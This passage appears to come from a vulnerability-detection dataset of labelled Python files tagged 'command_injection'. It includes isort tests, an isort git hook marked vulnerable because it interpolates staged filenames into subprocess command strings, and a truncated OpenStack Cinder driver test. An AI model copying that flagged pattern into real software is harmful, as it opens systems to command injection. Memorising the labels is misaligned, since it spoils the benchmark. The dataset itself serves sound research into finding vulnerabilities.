{'import_heading_stdlib': 'Standard library imports',\n              'import_heading_thirdparty': 'Third party imports',\n              'import_heading_firstparty': 'Local imports',\n              'known_third_party': ['numpy'],\n              'known_first_party': ['oklib']}  # type: Dict[str, Any]\n    test_input = ('# Standard library imports\\n'\n                  'import os.path as osp\\n'\n                  '\\n'\n                  '# Third party imports\\n'\n                  'import numpy as np\\n'\n                  '\\n'\n                  '# Local imports\\n'\n                  'from oklib.plot_ok import imagesc\\n')\n    assert SortImports(file_contents=test_input, **config).output == test_input\n\n\ndef test_isort_keeps_comments_issue_691():\n    test_input = ('import os\\n'\n                  '# This will make sure the app is always imported when\\n'\n                  '# Django starts so that shared_task will use this app.\\n'\n                  'from .celery import app as celery_app  # noqa\\n'\n                  '\\n'\n                  'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\\n'\n                  '\\n'\n                  'def path(*subdirectories):\\n'\n                  '    return os.path.join(PROJECT_DIR, *subdirectories)\\n')\n    expected_output = ('import os\\n'\n                       '\\n'\n                       '# This will make sure the app is always imported when\\n'\n                       '# Django starts so that shared_task will use this app.\\n'\n                       'from .celery import app as celery_app  # noqa\\n'\n                       '\\n'\n                       'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\\n'\n                       '\\n'\n                       'def path(*subdirectories):\\n'\n                       '    return os.path.join(PROJECT_DIR, *subdirectories)\\n')\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_pyi_formatting_issue_942(tmpdir):\n    test_input = ('import os\\n'\n                  '\\n'\n                  '\\n'\n                  'def my_method():\\n')\n    expected_py_output = test_input.splitlines()\n    expected_pyi_output = ('import os\\n'\n                           '\\n'\n                           'def my_method():\\n').splitlines()\n    assert SortImports(file_contents=test_input).output.splitlines() == expected_py_output\n    assert SortImports(file_contents=test_input,\n                       extension=\"pyi\").output.splitlines() == expected_pyi_output\n\n    source_py = tmpdir.join('source.py')\n    source_py.write(test_input)\n    assert SortImports(file_path=str(source_py)).output.splitlines() == expected_py_output\n\n    source_pyi = tmpdir.join('source.pyi')\n    source_pyi.write(test_input)\n    assert SortImports(file_path=str(source_pyi)).output.splitlines() == expected_pyi_output\n\n\ndef test_python_version():\n    from isort.main import parse_args\n\n    # test that the py_version can be added as flag\n    args = parse_args(['-py=2.7'])\n    assert args[\"py_version\"] == \"2.7\"\n\n    args = parse_args(['--python-version=3'])\n    assert args[\"py_version\"] == \"3\"\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  'import user\\n')\n    assert SortImports(file_contents=test_input, py_version=\"3\").output == test_input\n\n    # user is part of the standard library in python 2\n    output_python_2 = ('import os\\n'\n                       'import user\\n')\n    assert SortImports(file_contents=test_input, py_version=\"2.7\").output == output_python_2\n\n    test_input = ('import os\\nimport xml')\n\n    print(SortImports(file_contents=test_input, py_version=\"all\").output )\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "1ab38f4f7840a3c19bf961a24630a992a8373a76", "code": "/isort/hooks.py/n/n\"\"\"isort.py.\n\nDefines a git hook to allow pre-commit warnings and errors about import order.\n\nusage:\n    exit_code = git_hook(strict=True|False, modify=True|False)\n\nCopyright (C) 2015  Helen Sherwood-Taylor\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\ndocumentation files (the \"Software\"), to deal in the Software without restriction, including without limitation\nthe rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and\nto permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or\nsubstantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED\nTO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\nTHE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\nCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\nOTHER DEALINGS IN THE SOFTWARE.\n\n\"\"\"\nimport subprocess\nfrom typing import List\n\nfrom isort import SortImports\n\n\ndef get_output(command: str) -> bytes:\n    \"\"\"\n    Run a command and return raw output\n\n    :param str command: the command to run\n    :returns: the stdout output of the command\n    \"\"\"\n    return subprocess.check_output(command.split())\n\n\ndef get_lines(command: str) -> List[str]:\n    \"\"\"\n    Run a command and return lines of output\n\n    :param str command: the command to run\n    :returns: list of whitespace-stripped lines output by command\n    \"\"\"\n    stdout = get_output(command)\n    return [line.strip().decode() for line in stdout.splitlines()]\n\n\ndef git_hook(strict=False, modify=False):\n    \"\"\"\n    Git pre-commit hook to check staged files for isort errors\n\n    :param bool strict - if True, return number of errors on exit,\n        causing the hook to fail. If False, return zero so it will\n        just act as a warning.\n    :param bool modify - if True, fix the sources if they are not\n        sorted properly. If False, only report result without\n        modifying anything.\n\n    :return number of errors if in strict mode, 0 otherwise.\n    \"\"\"\n\n    # Get list of files modified and staged\n    diff_cmd = \"git diff-index --cached --name-only --diff-filter=ACMRTUXB HEAD\"\n    files_modified = get_lines(diff_cmd)\n\n    errors = 0\n    for filename in files_modified:\n        if filename.endswith('.py'):\n            # Get the staged contents of the file\n            staged_cmd = \"git show :%s\" % filename\n            staged_contents = get_output(staged_cmd)\n\n            sort = SortImports(\n                file_path=filename,\n                file_contents=staged_contents.decode(),\n                check=True\n            )\n\n            if sort.incorrectly_sorted:\n                errors += 1\n                if modify:\n                    SortImports(\n                        file_path=filename,\n                        file_contents=staged_contents.decode(),\n                        check=False,\n                    )\n\n    return errors if strict else 0\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "c55589b131828f3a595903f6796cb2d0babb772f", "code": "cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python\n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nUnit tests for OpenStack Cinder volume drivers\n\"\"\"\nimport ast\nimport mox\nimport shutil\nimport tempfile\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import test\nfrom cinder.volume import configuration as conf\nfrom cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver\nfrom cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver\n\nLOG = logging.getLogger(__name__)\n\nHP3PAR_DOMAIN = 'OpenStack',\nHP3PAR_CPG = 'OpenStackCPG',\nHP3PAR_CPG_SNAP = 'OpenStackCPGSnap'\nCLI_CR = '\\r\\n'\n\n\nclass FakeHP3ParClient(object):\n\n    api_url = None\n    debug = False\n\n    volumes = []\n    hosts = []\n    vluns = []\n    cpgs = [\n        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},\n                      'incrementMiB': 8192},\n         'SAUsage': {'rawTotalMiB': 24576,\n                     'rawUsedMiB': 768,\n                     'totalMiB': 8192,\n                     'usedMiB': 256},\n         'SDGrowth': {'LDLayout': {'RAIDType': 4,\n                      'diskPatterns': [{'diskType': 2}]},\n                      'incrementMiB': 32768},\n         'SDUsage': {'rawTotalMiB': 49152,\n                     'rawUsedMiB': 1023,\n                     'totalMiB': 36864,\n                     'usedMiB': 768},\n         'UsrUsage': {'rawTotalMiB': 57344,\n                      'rawUsedMiB': 43349,\n                      'totalMiB': 43008,\n                      'usedMiB': 32512},\n         'additionalStates': [],\n         'degradedStates': [],\n         'domain': HP3PAR_DOMAIN,\n         'failedStates': [],\n         'id': 5,\n         'name': HP3PAR_CPG,\n         'numFPVVs': 2,\n         'numTPVVs': 0,\n         'state': 1,\n         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]\n\n    def __init__(self, api_url):\n        self.api_url = api_url\n        self.volumes = []\n        self.hosts = []\n        self.vluns = []\n\n    def debug_rest(self, flag):\n        self.debug = flag\n\n    def login(self, username, password, optional=None):\n        return None\n\n    def logout(self):\n        return None\n\n    def getVolumes(self):\n        return self.volumes\n\n    def getVolume(self, name):\n        if self.volumes:\n            for volume in self.volumes:\n                if volume['name'] == name:\n                    return volume\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"VOLUME '%s' was not found\" % name}\n        raise hpexceptions.HTTPNotFound(msg)\n\n    def createVolume(self, name, cpgName, sizeMiB, optional=None):\n        new_vol = {'additionalStates': [],\n                   'adminSpace': {'freeMiB': 0,\n                                  'rawReservedMiB': 384,\n                                  'reservedMiB': 128,\n                                  'usedMiB': 128},\n                   'baseId': 115,\n                   'comment': optional['comment'],\n                   'copyType': 1,\n                   'creationTime8601': '2012-10-22T16:37:57-07:00',\n                   'creationTimeSec': 1350949077,\n                   'degradedStates': [],\n                   'domain': HP3PAR_DOMAIN,\n                   'failedStates': [],\n                   'id': 115,\n                   'name': name,\n                   'policies': {'caching': True,\n                                'oneHost': False,\n                                'staleSS': True,\n                                'system': False,\n                                'zeroDetect': False},\n                   'provisioningType': 1,\n                   'readOnly': False,\n                   'sizeMiB': sizeMiB,\n                   'snapCPG': optional['snapCPG'],\n                   'snapshotSpace': {'freeMiB': 0,\n                                     'rawReservedMiB': 683,\n                                     'reservedMiB': 512,\n                                     'usedMiB': 512},\n                   'ssSpcAllocLimitPct': 0,\n                   'ssSpcAllocWarningPct': 0,\n                   'state': 1,\n                   'userCPG': cpgName,\n                   'userSpace': {'freeMiB': 0,\n                                 'rawReservedMiB': 41984,\n                                 'reservedMiB': 31488,\n                                 'usedMiB': 31488},\n                   'usrSpcAllocLimitPct': 0,\n                   'usrSpcAllocWarningPct': 0,\n                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',\n                   'wwn': '50002AC00073383D'}\n        self.volumes.append(new_vol)\n        return None\n\n    def deleteVolume(self, name):\n        volume = self.getVolume(name)\n        self.volumes.remove(volume)\n\n    def createSnapshot(self, name, copyOfName, optional=None):\n        new_snap = {'additionalStates': [],\n                    'adminSpace': {'freeMiB': 0,\n                                   'rawReservedMiB': 0,\n                                   'reservedMiB': 0,\n                                   'usedMiB': 0},\n                    'baseId': 342,\n                    'comment': optional['comment'],\n                    'copyOf': copyOfName,\n                    'copyType': 3,\n                    'creationTime8601': '2012-11-09T15:13:28-08:00',\n                    'creationTimeSec': 1352502808,\n                    'degradedStates': [],\n                    'domain': HP3PAR_DOMAIN,\n                    'expirationTime8601': '2012-11-09T17:13:28-08:00',\n                    'expirationTimeSec': 1352510008,\n                    'failedStates': [],\n                    'id': 343,\n                    'name': name,\n                    'parentId': 342,\n                    'policies': {'caching': True,\n                                 'oneHost': False,\n                                 'staleSS': True,\n                                 'system': False,\n                                 'zeroDetect': False},\n                    'provisioningType': 3,\n                    'readOnly': True,\n                    'retentionTime8601': '2012-11-09T16:13:27-08:00',\n                    'retentionTimeSec': 1352506407,\n                    'sizeMiB': 256,\n                    'snapCPG': HP3PAR_CPG_SNAP,\n                    'snapshotSpace': {'freeMiB': 0,\n                                      'rawReservedMiB': 0,\n                                      'reservedMiB': 0,\n                                      'usedMiB': 0},\n                    'ssSpcAllocLimitPct': 0,\n                    'ssSpcAllocWarningPct': 0,\n                    'state': 1,\n                    'userCPG': HP3PAR_CPG,\n                    'userSpace': {'freeMiB': 0,\n                                  'rawReservedMiB': 0,\n                                  'reservedMiB': 0,\n                                  'usedMiB': 0},\n                    'usrSpcAllocLimitPct': 0,\n                    'usrSpcAllocWarningPct': 0,\n                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',\n                    'wwn': '50002AC00157383D'}\n        self.volumes.append(new_snap)\n        return None\n\n    def deleteSnapshot(self, name):\n        volume = self.getVolume(name)\n        self.volumes.remove(volume)\n\n    def createCPG(self, name, optional=None):\n        cpg = {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},\n                            'incrementMiB': 8192},\n               'SAUsage': {'rawTotalMiB': 24576,\n                           'rawUsedMiB': 768,\n                           'totalMiB': 8192,\n                           'usedMiB': 256},\n               'SDGrowth': {'LDLayout': {'RAIDType': 4,\n                            'diskPatterns': [{'diskType': 2}]},\n                            'incrementMiB': 32768},\n               'SDUsage': {'rawTotalMiB': 49152,\n                           'rawUsedMiB': 1023,\n                           'totalMiB': 36864,\n                           'usedMiB': 768},\n               'UsrUsage': {'rawTotalMiB': 57344,\n                            'rawUsedMiB': 43349,\n                            'totalMiB': 43008,\n                            'usedMiB': 32512},\n               'additionalStates': [],\n               'degradedStates': [],\n               'domain': HP3PAR_DOMAIN,\n               'failedStates': [],\n               'id': 1,\n               'name': name,\n               'numFPVVs': 2,\n               'numTPVVs': 0,\n               'state': 1,\n               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}\n\n        new_cpg = cpg.copy()\n        new_cpg.update(optional)\n        self.cpgs.append(new_cpg)\n\n    def getCPGs(self):\n        return self.cpgs\n\n    def getCPG(self, name):\n        if self.cpgs:\n            for cpg in self.cpgs:\n                if cpg['name'] == name:\n                    return cpg\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"CPG '%s' was not found\" % name}\n        raise hpexceptions.HTTPNotFound(msg)\n\n    def deleteCPG(self, name):\n        cpg = self.getCPG(name)\n        self.cpgs.remove(cpg)\n\n    def createVLUN(self, volumeName, lun, hostname=None,\n                   portPos=None, noVcn=None,\n                   overrideLowerPriority=None):\n\n        vlun = {'active': False,\n                'failedPathInterval': 0,\n                'failedPathPol': 1,\n                'hostname': hostname,\n                'lun': lun,\n                'multipathing': 1,\n                'portPos': portPos,\n                'type': 4,\n                'volumeName': volumeName,\n                'volumeWWN': '50002AC00077383D'}\n        self.vluns.append(vlun)\n        return None\n\n    def deleteVLUN(self, name, lunID, hostname=None, port=None):\n        vlun = self.getVLUN(name)\n        self.vluns.remove(vlun)\n\n    def getVLUNs(self):\n        return self.vluns\n\n    def getVLUN(self, volumeName):\n        for vlun in self.vluns:\n            if vlun['volumeName'] == volumeName:\n                return vlun\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"VLUN '%s' was not found\" % volumeName}\n        raise hpexceptions.HTTPNotFound(msg)\n\n\nclass HP3PARBaseDriver():\n\n    VOLUME_ID = \"d03338a9-9115-48a3-8dfc-35cdfcdc15a7\"\n    CLONE_ID = \"d03338a9-9115-48a3-8dfc-000000000000\"\n    VOLUME_NAME = \"volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7\"\n    SNAPSHOT_ID = \"2f823bdc-e36e-4dc8-bd15-de1c7a28ff31\"\n    SNAPSHOT_NAME = \"snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31\"\n    VOLUME_3PAR_NAME = \"osv-0DM4qZEVSKON-DXN-NwVpw\"\n    SNAPSHOT_3PAR_NAME = \"oss-L4I73ONuTci9Fd4ceij-MQ\"\n    FAKE_HOST = \"fakehost\"\n    USER_ID = '2689d9a913974c008b1d859013f23607'\n    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'\n    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'\n    FAKE_DESC = 'test description name'\n    FAKE_FC_PORTS = ['0987654321234', '123456789000987']\n    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}\n    VVS_NAME = \"myvvs\"\n    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',\n                                    'iqn': ('iqn.2000-05.com.3pardata:'\n                                            '21810002ac00383d'),\n                                    'ip_port': '3262'}}\n\n    volume = {'name': VOLUME_NAME,\n              'id': VOLUME_ID,\n              'display_name': 'Foo Volume',\n              'size': 2,\n              'host': FAKE_HOST,\n              'volume_type': None,\n              'volume_type_id': None}\n\n    volume_qos = {'name': VOLUME_NAME,\n                  'id': VOLUME_ID,\n                  'display_name': 'Foo Volume',\n                  'size': 2,\n                  'host': FAKE_HOST,\n                  'volume_type': None,\n                  'volume_type_id': 'gold'}\n\n    snapshot = {'name': SNAPSHOT_NAME,\n                'id': SNAPSHOT_ID,\n                'user_id': USER_ID,\n                'project_id': PROJECT_ID,\n                'volume_id': VOLUME_ID_SNAP,\n                'volume_name': VOLUME_NAME,\n                'status': 'creating',\n                'progress': '0%',\n                'volume_size': 2,\n                'display_name': 'fakesnap',\n                'display_description': FAKE_DESC}\n\n    connector = {'ip': '10.0.0.2',\n                 'initiator': 'iqn.1993-08.org.debian:01:222',\n                 'wwpns': [\"123456789012345\", \"123456789054321\"],\n                 'wwnns': [\"223456789012345\", \"223456789054321\"],\n                 'host': 'fakehost'}\n\n    volume_type = {'name': 'gold',\n                   'deleted': False,\n                   'updated_at': None,\n                   'extra_specs': {'qos:maxBWS': '50',\n                                   'qos:maxIOPS': '1000'},\n                   'deleted_at': None,\n                   'id': 'gold'}\n\n    def setup_configuration(self):\n        configuration = mox.MockObject(conf.Configuration)\n        configuration.hp3par_debug = False\n        configuration.hp3par_username = 'testUser'\n        configuration.hp3par_password = 'testPassword'\n        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'\n        configuration.hp3par_domain = HP3PAR_DOMAIN\n        configuration.hp3par_cpg = HP3PAR_CPG\n        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP\n        configuration.iscsi_ip_address = '1.1.1.2'\n        configuration.iscsi_port = '1234'\n        configuration.san_ip = '2.2.2.2'\n        configuration.san_login = 'test'\n        configuration.san_password = 'test'\n        configuration.hp3par_snapshot_expiration = \"\"\n        configuration.hp3par_snapshot_retention = \"\"\n        configuration.hp3par_iscsi_ips = []\n        return configuration\n\n    def setup_fakes(self):\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_get_3par_host\",\n                       self.fake_get_3par_host)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_delete_3par_host\",\n                       self.fake_delete_3par_host)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_3par_vlun\",\n                       self.fake_create_3par_vlun)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_ports\",\n                       self.fake_get_ports)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n\n    def clear_mox(self):\n        self.mox.ResetAll()\n        self.stubs.UnsetAll()\n\n    def fake_create_client(self):\n        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)\n\n    def fake_get_cpg(self, volume, allowSnap=False):\n        return HP3PAR_CPG\n\n    def fake_set_connections(self):\n        return\n\n    def fake_get_domain(self, cpg):\n        return HP3PAR_DOMAIN\n\n    def fake_extend_volume(self, volume, new_size):\n        vol = self.driver.common.client.getVolume(volume['name'])\n        old_size = vol['sizeMiB']\n        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}\n        self.driver.common.client.deleteVolume(volume['name'])\n        self.driver.common.client.createVolume(vol['name'],\n                                               vol['userCPG'],\n                                               new_size, option)\n\n    def fake_get_3par_host(self, hostname):\n        if hostname not in self._hosts:\n            msg = {'code': 'NON_EXISTENT_HOST',\n                   'desc': \"HOST '%s' was not found\" % hostname}\n            raise hpexceptions.HTTPNotFound(msg)\n        else:\n            return self._hosts[hostname]\n\n    def fake_delete_3par_host(self, hostname):\n        if hostname not in self._hosts:\n            msg = {'code': 'NON_EXISTENT_HOST',\n                   'desc': \"HOST '%s' was not found\" % hostname}\n            raise hpexceptions.HTTPNotFound(msg)\n        else:\n            del self._hosts[hostname]\n\n    def fake_create_3par_vlun(self, volume, hostname):\n        self.driver.common.client.createVLUN(volume, 19, hostname)\n\n    def fake_get_ports(self):\n        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}\n\n    def fake_get_volume_type(self, type_id):\n        return self.volume_type\n\n    def fake_get_qos_by_volume_type(self, volume_type):\n        return self.QOS\n\n    def fake_add_volume_to_volume_set(self, volume, volume_name,\n                                      cpg, vvs_name, qos):\n        return volume\n\n    def fake_copy_volume(self, src_name, dest_name, cpg=None,\n                         snap_cpg=None, tpvv=True):\n        pass\n\n    def fake_get_volume_stats(self, vol_name):\n        return \"normal\"\n\n    def fake_get_volume_settings_from_type(self, volume):\n        return {'cpg': HP3PAR_CPG,\n                'snap_cpg': HP3PAR_CPG_SNAP,\n                'vvs_name': self.VVS_NAME,\n                'qos': self.QOS,\n                'tpvv': True,\n                'volume_type': self.volume_type}\n\n    def fake_get_volume_settings_from_type_noqos(self, volume):\n        return {'cpg': HP3PAR_CPG,\n                'snap_cpg': HP3PAR_CPG_SNAP,\n                'vvs_name': None,\n                'qos': None,\n                'tpvv': True,\n                'volume_type': None}\n\n    def test_create_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type_noqos)\n        self.driver.create_volume(self.volume)\n        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)\n\n    def test_create_volume_qos(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_add_volume_to_volume_set\",\n                       self.fake_add_volume_to_volume_set)\n        self.driver.create_volume(self.volume_qos)\n        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n\n        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)\n        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))\n\n    def test_delete_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.driver.delete_volume(self.volume)\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVolume,\n                          self.VOLUME_ID)\n\n    def test_create_cloned_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_copy_volume\",\n                       self.fake_copy_volume)\n        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,\n                  'id': HP3PARBaseDriver.CLONE_ID,\n                  'display_name': 'Foo Volume',\n                  'size': 2,\n                  'host': HP3PARBaseDriver.FAKE_HOST,\n                  'source_volid': HP3PARBaseDriver.VOLUME_ID}\n        src_vref = {}\n        model_update = self.driver.create_cloned_volume(volume, src_vref)\n        self.assertTrue(model_update is not None)\n\n    def test_create_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n        self.driver.create_snapshot(self.snapshot)\n\n        # check to see if the snapshot was created\n        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)\n\n    def test_delete_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n\n        self.driver.create_snapshot(self.snapshot)\n        #make sure it exists first\n        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)\n        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)\n        self.driver.delete_snapshot(self.snapshot)\n\n        # the snapshot should be deleted now\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVolume,\n                          self.SNAPSHOT_3PAR_NAME)\n\n    def test_create_volume_from_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)\n\n        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)\n\n        volume = self.volume.copy()\n        volume['size'] = 1\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.create_volume_from_snapshot,\n                          volume, self.snapshot)\n\n    def test_create_volume_from_snapshot_qos(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_get_volume_type\",\n                       self.fake_get_volume_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_get_qos_by_volume_type\",\n                       self.fake_get_qos_by_volume_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_add_volume_to_volume_set\",\n                       self.fake_add_volume_to_volume_set)\n        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)\n        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)\n        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))\n\n        volume = self.volume.copy()\n        volume['size'] = 1\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.create_volume_from_snapshot,\n                          volume, self.snapshot)\n\n    def test_terminate_connection(self):\n        self.flags(lock_path=self.tempdir)\n        #setup the connections\n        self.driver.initialize_connection(self.volume, self.connector)\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)\n        self.driver.terminate_connection(self.volume, self.connector,\n                                         force=True)\n        # vlun should be gone.\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVLUN,\n                          self.VOLUME_3PAR_NAME)\n\n    def test_extend_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.UnsetAll()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"extend_volume\",\n                       self.fake_extend_volume)\n        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}\n        self.driver.common.client.createVolume(self.volume['name'],\n                                               HP3PAR_CPG,\n                                               self.volume['size'],\n                                               option)\n        old_size = self.volume['size']\n        volume = self.driver.common.client.getVolume(self.volume['name'])\n        self.driver.extend_volume(volume, str(old_size + 1))\n        vol = self.driver.common.client.getVolume(self.volume['name'])\n        self.assertEqual(vol['sizeMiB'], str(old_size + 1))\n\n\nclass TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):\n\n    _hosts = {}\n\n    def setUp(self):\n        self.tempdir = tempfile.mkdtemp()\n        super(TestHP3PARFCDriver, self).setUp()\n        self.setup_driver(self.setup_configuration())\n        self.setup_fakes()\n\n    def setup_fakes(self):\n        super(TestHP3PARFCDriver, self).setup_fakes()\n        self.stubs.Set(hpfcdriver.HP3PARFCDriver,\n                       \"_create_3par_fibrechan_host\",\n                       self.fake_create_3par_fibrechan_host)\n\n    def tearDown(self):\n        shutil.rmtree(self.tempdir)\n        super(TestHP3PARFCDriver, self).tearDown()\n\n    def setup_driver(self, configuration):\n        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.driver.do_setup(None)\n\n    def fake_create_3par_fibrechan_host(self, hostname, wwn,\n                                        domain, persona_id):\n        host = {'FCPaths': [{'driverVersion': None,\n                             'firmwareVersion': None,\n                             'hostSpeed': 0,\n                             'model': None,\n                             'portPos': {'cardPort': 1, 'node': 1,\n                                         'slot': 2},\n                             'vendor': None,\n                             'wwn': wwn[0]},\n                            {'driverVersion': None,\n                             'firmwareVersion': None,\n                             'hostSpeed': 0,\n                             'model': None,\n                             'portPos': {'cardPort': 1, 'node': 0,\n                                         'slot': 2},\n                             'vendor': None,\n                             'wwn': wwn[1]}],\n                'descriptors': None,\n                'domain': domain,\n                'iSCSIPaths': [],\n                'id': 11,\n                'name': hostname}\n        self._hosts[hostname] = host\n        self.properties = {'data':\n                          {'target_discovered': True,\n                           'target_lun': 186,\n                           'target_portal': '1.1.1.2:1234'},\n                           'driver_volume_type': 'fibre_channel'}\n        return hostname\n\n    def test_initialize_connection(self):\n        self.flags(lock_path=self.tempdir)\n        result = self.driver.initialize_connection(self.volume, self.connector)\n        self.assertEqual(result['driver_volume_type'], 'fibre_channel')\n\n        # we should have a host and a vlun now.\n        host = self.fake_get_3par_host(self.FAKE_HOST)\n        self.assertEquals(self.FAKE_HOST, host['name'])\n        self.assertEquals(HP3PAR_DOMAIN, host['domain'])\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n\n        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])\n        self.assertEquals(self.FAKE_HOST, vlun['hostname'])\n\n    def 